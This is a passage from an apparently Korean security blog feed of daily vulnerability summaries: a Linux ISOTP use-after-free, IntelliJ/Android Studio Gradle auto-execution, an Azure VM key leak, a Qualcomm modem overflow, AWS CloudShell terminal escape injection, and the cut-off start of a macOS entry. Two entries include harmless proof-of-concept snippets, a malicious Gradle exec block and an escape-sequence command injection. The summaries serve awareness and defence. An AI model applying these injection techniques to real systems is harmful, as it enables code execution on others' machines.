&#xCDE8;&#xC57D;&#xC810;&#xC740; CAN network subsystem &#xB0B4;&#xBD80;&#xC758; ISOTP CAN network &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC5D0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. Race condition&#xC73C;&#xB85C; Socket&#xC774; bound &#xB41C; &#xC774;&#xD6C4;&#xC5D0;&#xB3C4; socket &#xC635;&#xC158;&#xC744; &#xC218;&#xC815;&#xD560; &#xC218; &#xC788;&#xACE0; &#xC774;&#xB85C; &#xC778;&#xD574; use-after-free&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><p>CAN ISOTP &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC740; &#xAE30;&#xBCF8; &#xC258;&#xC774; &#xC544;&#xB2CC; &#xB2E4;&#xB978; socket &#xC635;&#xC158;&#xC774; &#xC0AC;&#xC6A9;&#xB418;&#xBA74; <code>isotp_setsockopt()</code>&#xB97C; &#xD638;&#xCD9C;&#xD574; socket &#xC635;&#xC158;&#xC744; &#xC801;&#xC6A9;&#xC2DC;&#xD0B5;&#xB2C8;&#xB2E4;. <code>isotp_setsockopt()</code>&#xB294; ISOPT socket&#xC774; &#xC774;&#xBBF8; &#xBC14;&#xC778;&#xB4DC; &#xB41C; &#xC0C1;&#xD0DC;&#xB77C;&#xBA74; &#xB9AC;&#xD134;, &#xBC14;&#xC778;&#xB4DC; &#xB418;&#xC9C0; &#xC54A;&#xC740; &#xC0C1;&#xD0DC;&#xB77C;&#xBA74; <code>isotp_bind()</code>&#xB97C; &#xD638;&#xCD9C;&#xD574; &#xBC14;&#xC778;&#xB4DC; &#xC791;&#xC5C5;&#xC744; &#xAC70;&#xCE58;&#xACE0; user space&#xB85C;&#xBD80;&#xD130; socket &#xC635;&#xC158; &#xB370;&#xC774;&#xD130;&#xB97C; &#xBCF5;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4;.</p><p><code>isotp_bind()</code>&#xAC00; ISOTP socket&#xC744; &#xBC14;&#xC778;&#xB4DC; &#xD560; &#xB54C; &#xD574;&#xB2F9; socket &#xC635;&#xC158;&#xC758; <code>flag</code>&#xAC12;&#xC774;  <code>CAN_ISOTP_SF_BROADCAST</code>&#xAC00; &#xC544;&#xB2D0; &#xB54C;&#xB9CC; CAN &#xC218;&#xC2E0;&#xAE30;&#xB97C; &#xB4F1;&#xB85D;&#xD569;&#xB2C8;&#xB2E4;. &#xB9CC;&#xC57D;  <code>isotp_bind()</code>&#xAC00; socket&#xC744; &#xBC14;&#xC778;&#xB4DC; &#xD55C; &#xC9C1;&#xD6C4; user space&#xB85C;&#xBD80;&#xD130; socket &#xC635;&#xC158; &#xB370;&#xC774;&#xD130;&#xB97C; &#xBCF5;&#xC0AC;&#xD558;&#xAE30; &#xC9C1;&#xC804;&#xC5D0; race condition&#xC744; &#xBC1C;&#xC0DD;&#xC2DC;&#xD0A8;&#xB2E4;&#xBA74; <code>flag</code>&#xAC12;&#xC774; <code>CAN_ISOTP_SF_BROADCAST</code>&#xC774;&#xBA74;&#xC11C; CAN &#xC218;&#xC2E0;&#xAE30;&#xAC00; &#xB4F1;&#xB85D;&#xB41C; socket&#xC744; &#xC0DD;&#xC131;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xD6C4;&#xC5D0; &#xD568;&#xC218; <code>isotp_release()</code>&#xAC00; &#xD638;&#xCD9C;&#xB418;&#xC5B4; socket&#xC744; &#xD574;&#xC81C;&#xD560; &#xB54C; <code>flag</code>&#xAC12;&#xC774;  <code>CAN_ISOTP_SF_BROADCAST</code>&#xC774;&#xBBC0;&#xB85C; &#xB4F1;&#xB85D;&#xB41C; CAN &#xC218;&#xC2E0;&#xAE30;&#xB97C; &#xADF8;&#xB300;&#xB85C; &#xB0A8;&#xACA8;&#xB193;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xD1B5;&#xD574; &#xC774;&#xBBF8; &#xD574;&#xC81C;&#xB41C; socket&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xB418;&#xACE0; use-after-free&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. &#xD574;&#xCEE4;&#xB294; &#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC545;&#xC6A9;&#xD574; &#xB85C;&#xCEEC; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC744; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>lpe</tag>
      
      <tag>linux</tag>
      
      <tag>kernel</tag>
      
      <tag>Fabu1ous</tag>
      
      <tag>socket</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-29263: IntelliJ, Android Studio의 외부 저장소를 통한 원격 코드 실행 취약점</title>
    <link href="/2021/05/14/l0ch/2021-05-14/"/>
    <url>/2021/05/14/l0ch/2021-05-14/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://securitylab.github.com/advisories/GHSL-2020-337_338-intellij-idea-android-studio/">GHSL-2020-337_338: Arbitrary code execution when cloning/checking out a Gradle project - CVE-2021-29263</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>IntelliJ IDEA</li><li>Android Studio</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>IntelliJ&#xC640; Android Studio&#xC5D0;&#xC11C; &#xC545;&#xC131; &#xC800;&#xC7A5;&#xC18C;&#xB97C; &#xAC00;&#xC838;&#xC62C; &#xB54C; &#xC784;&#xC758; &#xCF54;&#xB4DC; &#xC2E4;&#xD589; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5B4; GitHub Security Lab&#xC5D0; &#xC138;&#xBD80; &#xC815;&#xBCF4;&#xAC00; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>Groovy&#xB97C; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xD55C; &#xC624;&#xD508;&#xC18C;&#xC2A4; &#xBE4C;&#xB4DC; &#xB3C4;&#xAD6C;&#xC778; <a href="https://github.com/gradle/gradle">Gradle</a> &#xC744; clone &#xB610;&#xB294; checkout&#xD560; &#xB54C; IntelliJ&#xC640; Android Studio&#xB294; &#xC720;&#xC800; &#xD655;&#xC778;&#xB2E8;&#xACC4;&#xB97C; &#xC0DD;&#xB7B5;&#xD558;&#xACE0; &#xBE4C;&#xB4DC; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xC545;&#xC6A9;&#xD55C; &#xD574;&#xCEE4;&#xAC00; &#xC545;&#xC131; &#xC800;&#xC7A5;&#xC18C;&#xB97C; &#xD0C0;&#xAC9F;&#xC5D0; clone &#xD639;&#xC740; checkout &#xD558;&#xB3C4;&#xB85D; &#xC720;&#xB3C4;&#xD558;&#xBA74; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; Gradle&#xC758; <code>exec</code>&#xAC00; &#xD0C0;&#xAC9F;&#xC758; &#xC0C1;&#xD638;&#xC791;&#xC6A9; &#xC5C6;&#xC774; malware dropper &#xAE30;&#xB2A5;&#xC744; &#xC218;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python">apply plugin: <span class="hljs-string">&apos;java&apos;</span>sourceCompatibility = <span class="hljs-number">1.8</span>targetCompatibility = <span class="hljs-number">1.8</span>void checkRequirements(){    <span class="hljs-keyword">exec</span> {      executable <span class="hljs-string">&apos;touch&apos;</span>      args <span class="hljs-string">&apos;/tmp/pwned_from_gradle&apos;</span>    }}build{    checkRequirements();}</code></pre><p>MS&#xC758; Visual Studio&#xC5D0;&#xC11C;&#xB3C4; &#xBE44;&#xC2B7;&#xD55C; &#xC720;&#xD615;&#xC758; &#xCDE8;&#xC57D;&#xC810;(CVE-2020-17156)&#xC774; &#xD328;&#xCE58;&#xB41C; &#xC801;&#xC774; &#xC788;&#xC73C;&#xBA70; &#xC774;&#xB294; &#xC624;&#xD508;&#xC18C;&#xC2A4; &#xC800;&#xC7A5;&#xC18C;&#xB97C; &#xC774;&#xC6A9;&#xD560; &#xB54C; &#xC8FC;&#xC758;&#xB97C; &#xAE30;&#xC6B8;&#xC77C; &#xD544;&#xC694;&#xAC00; &#xC788;&#xC74C;&#xC744; &#xC758;&#xBBF8;&#xD569;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>L0ch</tag>
      
      <tag>gradle</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-27075: Microsoft Azure 권한 상승 및 정보 유출 취약점</title>
    <link href="/2021/05/13/idioth/2021-05-13/"/>
    <url>/2021/05/13/idioth/2021-05-13/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.intezer.com/blog/cloud-security/cve-2021-27075-microsoft-azure-vulnerability-allows-privilege-escalation-and-leak-of-data/">CVE-2021-27075: Microsoft Azure Vulnerability Allows Privilege Escalation and Leak of Private Data</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Microsoft Azure VM Extension</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Microsoft&#xC758; &#xD074;&#xB77C;&#xC6B0;&#xB4DC; &#xCEF4;&#xD4E8;&#xD305; &#xD50C;&#xB7AB;&#xD3FC; Microsoft Azure&#xC5D0;&#xC11C; VM Linux &#xC2DC;&#xC2A4;&#xD15C;&#xC758; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xACFC; &#xC815;&#xBCF4; &#xC720;&#xCD9C;&#xC774; &#xAC00;&#xB2A5;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>Azure VM&#xC740; &#xAC1C;&#xBC1C;&#xC790;&#xC640; &#xAD00;&#xB9AC;&#xC790;&#xAC00; &#xCD94;&#xAC00; &#xAD6C;&#xC131;&#xC694;&#xC18C;&#xB97C; &#xC124;&#xCE58;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xD1B5;&#xD569; &#xD50C;&#xB7EC;&#xADF8;&#xC778; &#xC2DC;&#xC2A4;&#xD15C;&#xC744; &#xC81C;&#xACF5;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xAE30;&#xB2A5;&#xC744; &#xD1B5;&#xD574; Azure&#xC5D0;&#xC11C; &#xC81C;&#xACF5;&#xD558;&#xB294; first party &#xC678;&#xC5D0; third party app &#xB610;&#xD55C; &#xC124;&#xCE58;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB7EC;&#xD55C; &#xD655;&#xC7A5; &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xC124;&#xCE58;&#xB97C; &#xAD00;&#xB9AC;&#xD558;&#xAE30; &#xC704;&#xD574; Microsoft Azure Guest Agent&#xAC00; <code>/var/lib/waagent</code>&#xC5D0; &#xC124;&#xCE58;&#xB429;&#xB2C8;&#xB2E4;. &#xC774; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xC5D0;&#xB294; &#xD655;&#xC7A5; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC5D0; &#xB300;&#xD55C; &#xC815;&#xBCF4;&#xAC00; &#xC800;&#xC7A5;&#xB418;&#xC5B4; &#xC788;&#xC5B4; root&#xAC00; &#xC544;&#xB2CC; &#xC0AC;&#xC6A9;&#xC790;&#xB294; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD655;&#xC7A5; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; VM&#xC5D0; &#xCD94;&#xAC00;&#xB418;&#xBA74; &#xC124;&#xC815; &#xD30C;&#xC77C;&#xC740; Azure VM Manager&#xC778; Fabric Controller&#xC5D0; &#xC758;&#xD574; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xB429;&#xB2C8;&#xB2E4;. WAAgent&#xAC00; Fabric Controller&#xC5D0;&#xC11C; &#xC774; &#xD30C;&#xC77C;&#xC744; &#xBC1B;&#xC544;&#xC640;&#xC11C; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xD558;&#xACE0; &#xD655;&#xC7A5; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC744; &#xC124;&#xCE58;&#xD558;&#xACE0; deploy &#xD569;&#xB2C8;&#xB2E4;. WAAgent&#xB294; Fabric Controller&#xC640; &#xD2B9;&#xC815; IP &#xC8FC;&#xC18C;(168.63.129.16)&#xB97C; &#xD1B5;&#xD574; &#xD1B5;&#xC2E0;&#xD569;&#xB2C8;&#xB2E4;. ExtensionConfig &#xD30C;&#xC77C;&#xC758; &#xC5D4;&#xB4DC; &#xD3EC;&#xC778;&#xD2B8; Response&#xC5D0;&#xB294; &#xAC1C;&#xC778; &#xD0A4;&#xC640; &#xAC19;&#xC740; &#xC815;&#xBCF4;&#xAC00; &#xD3EC;&#xD568;&#xB418;&#xC5B4; &#xC788;&#xC73C;&#xBA70; &#xD0A4;&#xB294; <code>/var/lib/waagent/F54265F38F8D16C35C0E1FD3190882831A6C4384.prv</code>&#xC5D0; &#xC800;&#xC7A5;&#xB418;&#xACE0; &#xC778;&#xC99D;&#xC11C;&#xB294; <code>/var/lib/waagent/F54265F38F8D16C35C0E1FD3190882831A6C4384.crt</code>&#xC5D0; &#xC800;&#xC7A5;&#xB429;&#xB2C8;&#xB2E4;. ExtensionConfig &#xD30C;&#xC77C;&#xC5D0; &#xD0A4;&#xC640; &#xC778;&#xC99D;&#xC11C;&#xAC00; &#xD3EC;&#xD568;&#xB418;&#xC5B4; &#xC788;&#xC9C0; &#xC54A;&#xC73C;&#xBBC0;&#xB85C; &#xD655;&#xC7A5; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC744; deploy &#xD560; &#xB54C; Wire Server&#xC640; &#xD1B5;&#xC2E0;&#xD558;&#xC5EC; Certificates endpoint&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294;&#xB370; &#xC774;&#xB54C; &#xC804;&#xC1A1;&#xB41C; &#xC778;&#xC99D;&#xC11C;&#xC5D0; &#xB300;&#xD55C; &#xAC80;&#xC99D;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xC9C0; &#xC54A;&#xC544; &#xC815;&#xBCF4; &#xC720;&#xCD9C;&#xC774; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xCEE4;&#xAC00; &#xC790;&#xC2E0;&#xC758; &#xAC1C;&#xC778; &#xD0A4;&#xC640; &#xC778;&#xC99D;&#xC11C;&#xB97C; &#xB9CC;&#xB4E4;&#xC5B4; &#xADF8;&#xB97C; &#xD1B5;&#xD574; Wire Server&#xC5D0; &#xC554;&#xD638;&#xD654;&#xB41C; &#xD0A4;&#xB97C; &#xC218;&#xC2E0;&#xD569;&#xB2C8;&#xB2E4;. Transport Key&#xB97C; &#xD1B5;&#xD574; &#xC554;&#xD638;&#xD654;&#xB41C; &#xD0A4;&#xB97C; &#xBCF5;&#xD638;&#xD654;&#xD558;&#xC5EC; ExtensionConfig&#xC758; <code>protectedSettings</code>&#xB97C; &#xC77D;&#xC5B4;&#xC62C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C; Azure Instance Metadata Service&#xC778; 169.254.169.254&#xC640;&#xC758; &#xD1B5;&#xC2E0;&#xC744; &#xD1B5;&#xD574; 168.63.129.16&#xC5D0; &#xD544;&#xC694;&#xD55C; root &#xAD8C;&#xD55C; &#xC5C6;&#xC774; Wire Server&#xC640; &#xD1B5;&#xC2E0;&#xD558;&#xC5EC; &#xC815;&#xBCF4;&#xB97C; &#xC720;&#xCD9C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>microsoft</tag>
      
      <tag>idioth</tag>
      
      <tag>azure</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-11292: 안드로이드 기기를 도청할 수 있는 Qualcomm 칩 취약점</title>
    <link href="/2021/05/12/fabu1ous/2021-05-12/"/>
    <url>/2021/05/12/fabu1ous/2021-05-12/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://research.checkpoint.com/2021/security-probe-of-qualcomm-msm/">Security probe of Qualcomm MSM data services</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Qualcomm MSM<br>issue: QPSIIR-1441</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Check Point Research&#xAC00; Qualcomm&#xC758; MSM(Mobile Station Modem) data service&#xC5D0;&#xC11C; &#xBC1C;&#xACAC;&#xB41C; heap overflow &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xACF5;&#xAC1C;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xBC88;&#xC5D0; &#xACF5;&#xAC1C;&#xB41C; write-up&#xC5D0;&#xC11C; &#xC8FC;&#xBAA9;&#xD560; &#xC810;&#xC740; QMI(Qualcomm MSM Interface)&#xAC00; MSM &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC758; &#xACF5;&#xACA9; &#xBCA1;&#xD130;&#xB85C; &#xC0AC;&#xC6A9;&#xB420; &#xC218; &#xC788;&#xB2E4;&#xB294; &#xC810;&#xC785;&#xB2C8;&#xB2E4;. MSM&#xC740; QuRT(Qualcomm real-time OS)&#xC758; &#xAD00;&#xB9AC;&#xB97C; &#xBC1B;&#xC544; &#xB8E8;&#xD305; &#xB41C; &#xC548;&#xB4DC;&#xB85C;&#xC774;&#xB4DC; &#xAE30;&#xAE30;&#xC5D0;&#xC11C;&#xB3C4; &#xB514;&#xBC84;&#xAE45;&#xC774;&#xB098; &#xBA54;&#xBAA8;&#xB9AC; &#xB364;&#xD551;&#xC774; &#xBD88;&#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; MSM&#xC758; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4; &#xAD6C;&#xC131; &#xC694;&#xC18C;&#xC640; &#xC8FC;&#xBCC0; &#xC11C;&#xBE0C;&#xC2DC;&#xC2A4;&#xD15C; &#xAC04;&#xC758; &#xD1B5;&#xC2E0;&#xC744; &#xB2F4;&#xB2F9;&#xD558;&#xB294; QMI&#xB97C; &#xD1B5;&#xD574; data service&#xB97C; &#xACF5;&#xACA9;&#xD558;&#xACE0; QuRT&#xB97C; (&#xC545;&#xC131;&#xCF54;&#xB4DC;&#xB85C;) &#xD328;&#xCE58;&#xD558;&#xB294; &#xAC83;&#xC774; Check Point Research&#xAC00; &#xC81C;&#xC2DC;&#xD55C; &#xBC29;&#xBC95;&#xC785;&#xB2C8;&#xB2E4;.</p><ul><li><p>CVE-2020-11292</p><p>QMI&#xC5D0; &#xC804;&#xB2EC;&#xB418;&#xB294; &#xC720;&#xC800; &#xC81C;&#xACF5; &#xB370;&#xC774;&#xD130;&#xC758; &#xAC80;&#xC99D; &#xBBF8;&#xD761;&#xC73C;&#xB85C; heap overflow&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. &#xD578;&#xB4E4;&#xB7EC; &#xD568;&#xC218; <code>qmi_voicei_srvcc_call_config_req</code>&#xB294; &#xC548;&#xB4DC;&#xB85C;&#xC774;&#xB4DC;&#xB85C;&#xBD80;&#xD130; &#xBC1B;&#xC740; QMI &#xBA54;&#xC138;&#xC9C0;&#xB97C; &#xD30C;&#xC2F1;&#xD569;&#xB2C8;&#xB2E4;. QMI &#xBA54;&#xC138;&#xC9C0;&#xC5D0;&#xC11C; TLV payload&#xB97C; &#xD30C;&#xC2F1; &#xD560; &#xB54C; <code>TLV packet type</code>&#xAC12; &#xB9CC;&#xD07C; &#xB8E8;&#xD504;&#xB97C; &#xB3CC;&#xBA70; &#xD799; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xD638;&#xCD9C; &#xCF58;&#xD14D;&#xC2A4;&#xD2B8;&#xB97C; &#xC62E;&#xAE30;&#xB294;&#xB370; &#xD574;&#xB2F9; &#xB8E8;&#xD504; &#xD68C;&#xC218;&#xC758; &#xCD5C;&#xB313;&#xAC12; &#xAC80;&#xC99D;&#xC774; &#xC5C6;&#xC5B4; overflow&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p></li></ul><p>MSM&#xC740; Qualcom&#xC5D0;&#xC11C; &#xC81C;&#xC791;&#xD55C; SoC(System on Chip)&#xC774;&#xBA70;, &#xD604;&#xC7AC; &#xC2A4;&#xB9C8;&#xD2B8;&#xD3F0;&#xC758; 30%&#xAC00;&#xB7C9;&#xC774; &#xD574;&#xB2F9; MSM &#xCE69;&#xACFC; QMI&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xC54C;&#xB824;&#xC838; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD574;&#xCEE4;&#xAC00; &#xC704;&#xC640; &#xAC19;&#xC740; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC545;&#xC6A9;&#xD55C;&#xB2E4;&#xBA74; MSM&#xB97C; &#xC81C;&#xC5B4;&#xD560; &#xC218; &#xC788;&#xC73C;&#xBA70; &#xBAA8;&#xB380;&#xC5D0; &#xC545;&#xC131;&#xCF54;&#xB4DC;&#xB97C; &#xC2EC;&#xC5B4;&#xB193;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xD1B5;&#xD574; &#xD574;&#xCEE4;&#xB294; &#xAE30;&#xAE30;&#xC758; SMS &#xAE30;&#xB85D; &#xBC0F; &#xD1B5;&#xD654; &#xB3C4;&#xCCAD;&#xC744; &#xD560; &#xC218; &#xC788;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>Fabu1ous</tag>
      
      <tag>android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] AWS CloudShell terminal escape injection 취약점</title>
    <link href="/2021/05/11/l0ch/2021-05-11/"/>
    <url>/2021/05/11/l0ch/2021-05-11/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2154">Issue 2154: Terminal escape injection in AWS CloudShell</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Dell Windows device</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>AWS Management Console&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9; &#xAC00;&#xB2A5;&#xD55C; &#xBE0C;&#xB77C;&#xC6B0;&#xC800; &#xAE30;&#xBC18; &#xC258;&#xC778; AWS CloudShell&#xC5D0;&#xC11C; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5B4; &#xC138;&#xBD80; &#xC815;&#xBCF4;&#xAC00; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; AWS CloudShell&#xC758; <code>aceterm</code> &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xC5D0;&#xC11C; <a href="https://xtermjs.org/docs/api/vtfeatures/">DCS(Device Control String)</a> &#xC774;&#xC2A4;&#xCF00;&#xC774;&#xD504; &#xBB38;&#xC790;&#xB97C; &#xCC98;&#xB9AC;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC5D0; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. </p><pre><code class="hljs python">case <span class="hljs-string">&apos;+q&apos;</span>:var pt = this.currentParam, valid = false;this.send(<span class="hljs-string">&apos;\x1bP&apos;</span> + +valid + <span class="hljs-string">&apos;+r&apos;</span> + pt + <span class="hljs-string">&apos;\x1b\\&apos;</span>);<span class="hljs-keyword">break</span>;</code></pre><p><code>echo -ne &apos;\eP+q6b64\e\\&apos;</code> &#xC744; &#xC785;&#xB825;&#xD558;&#xB294; &#xACBD;&#xC6B0; &#xC704; &#xCF54;&#xB4DC;&#xC5D0;&#xC11C; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xCC98;&#xB9AC;&#xB429;&#xB2C8;&#xB2E4;. <code>this.currenParam</code>&#xC740; <code>\eP+q</code> &#xC774;&#xC2A4;&#xCF00;&#xC774;&#xD504; &#xBB38;&#xC790; &#xB4A4;&#xC5D0; &#xC624;&#xB294; &#xC784;&#xC758;&#xC758; &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xD3EC;&#xD568;&#xD558;&#xBA70; <code>this.send()</code>&#xC5D0;&#xC11C; &#xC774;&#xB97C; &#xD130;&#xBBF8;&#xB110; &#xC785;&#xB825; &#xD578;&#xB4E4;&#xB7EC;&#xB85C; &#xC804;&#xB2EC;&#xD558;&#xB294;&#xB370;, &#xC774;&#xB54C; &#xAC1C;&#xD589;&#xC744; &#xD3EC;&#xD568;&#xD55C; &#xC784;&#xC758; &#xCF54;&#xB4DC;&#xB97C; &#xC0BD;&#xC785;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB97C; &#xC545;&#xC6A9;&#xD55C; &#xD574;&#xCEE4;&#xAC00; &#xD0C0;&#xAC9F;&#xC758; AWS &#xC778;&#xC2A4;&#xD134;&#xC2A4;&#xC5D0; <code>/tmp/foo</code> &#xD30C;&#xC77C;&#xC744; &#xC0DD;&#xC131;&#xD558;&#xB294; PoC&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python">$ echo -e <span class="hljs-string">&quot;echo -ne &quot;</span>abcdef\x1bP+q\ntouch /tmp/foo\n\x1b\n<span class="hljs-string">&quot;&quot;</span> &gt; index.html</code></pre><p>&#xD0C0;&#xAC9F; AWS CloudShell&#xC5D0;&#xC11C; &#xD574;&#xCEE4;&#xC758; <code>index.html</code>&#xC744; curl &#xB4F1;&#xC758; &#xD234;&#xB85C; &#xC561;&#xC138;&#xC2A4; &#xD558;&#xBA74; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xD2B8;&#xB9AC;&#xAC70; &#xB418;&#xC5B4; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>L0ch</tag>
      
      <tag>terminal escape injection</tag>
      
      <tag>aws</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-1815: MacOS 기본 설정을 통한 권한 상승 취약점</title>
    <link href="/2021/05/10/idioth/2021-05-10/"/>
    <url>/2021/05/10/idioth/2021-05-10/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.offensive-security.com/offsec/macos-preferences-priv-escalation/?utm_content=165476462&amp;utm_medium=social&amp;utm_source=twitter&amp;hss_channel=tw-134994790">MACOS LOCAL PRIVILEGE ESCALATION VIA PREFERENCES</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>MacOS &lt; 11.3</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Apple MacOS&#xC5D0;&#xC11C; 2020&#xB144; &#xD328;&#xCE58;&#xB41C; CVE-2020-9839&#xC758; &#xC798;&#xBABB;&#xB41C; &#xC218;&#xC815;&#xC73C;&#xB85C; &#xC778;&#xD55C; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>2020&#xB144;&#xC5D0; &#xBC1C;&#xACAC;&#xB41C; 